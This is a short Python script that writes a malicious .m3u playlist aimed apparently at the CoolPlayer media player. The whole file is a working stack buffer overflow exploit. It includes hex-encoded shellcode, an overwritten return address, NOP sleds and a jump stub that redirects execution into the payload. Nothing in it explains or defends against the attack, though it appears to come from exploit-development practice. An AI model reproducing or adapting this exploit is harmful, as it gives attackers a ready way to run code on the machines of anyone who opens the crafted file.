#!/usr/bin/python

buf =  ""
buf += "\xbe\x3e\x1b\x10\xc7\xd9\xc7\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x30\x31\x77\x13\x83\xc7\x04\x03\x77\x31\xf9"
buf += "\xe5\x3b\xa5\x7f\x05\xc4\x35\xe0\x8f\x21\x04\x20\xeb"
buf += "\x22\x36\x90\x7f\x66\xba\x5b\x2d\x93\x49\x29\xfa\x94"
buf += "\xfa\x84\xdc\x9b\xfb\xb5\x1d\xbd\x7f\xc4\x71\x1d\xbe"
buf += "\x07\x84\x5c\x87\x7a\x65\x0c\x50\xf0\xd8\xa1\xd5\x4c"
buf += "\xe1\x4a\xa5\x41\x61\xae\x7d\x63\x40\x61\xf6\x3a\x42"
buf += "\x83\xdb\x36\xcb\x9b\x38\x72\x85\x10\x8a\x08\x14\xf1"
buf += "\xc3\xf1\xbb\x3c\xec\x03\xc5\x79\xca\xfb\xb0\x73\x29"
buf += "\x81\xc2\x47\x50\x5d\x46\x5c\xf2\x16\xf0\xb8\x03\xfa"
buf += "\x67\x4a\x0f\xb7\xec\x14\x13\x46\x20\x2f\x2f\xc3\xc7"
buf += "\xe0\xa6\x97\xe3\x24\xe3\x4c\x8d\x7d\x49\x22\xb2\x9e"
buf += "\x32\x9b\x16\xd4\xde\xc8\x2a\xb7\xb4\x0f\xb8\xcd\xfa"
buf += "\x10\xc2\xcd\xaa\x78\xf3\x46\x25\xfe\x0c\x8d\x02\xf0"
buf += "\x46\x8c\x22\x99\x0e\x44\x77\xc4\xb0\xb2\xbb\xf1\x32"
buf += "\x37\x43\x06\x2a\x32\x46\x42\xec\xae\x3a\xdb\x99\xd0"
buf += "\xe9\xdc\x8b\xb2\x6c\x4f\x57\x35"

eip = '\x4b\xef\x80\x7c' 
cshell = '\x83\xc3\x64\x83\xc3\x64\x83\xc3\x64\xff\xe3' #add ebx,100 x3 jmp ebx
pshell = '\x90' * 50 + buf
nops = (260 - len(cshell)) * '\x90'

fill = (10000 - len(cshell+nops+eip+pshell)) * '\x43'

payload = cshell+nops+eip+pshell+fill

f = open("/root/exploit-dev/sift/coolplayer/msfpattern.m3u", "w")
f.write(payload)
f.close()
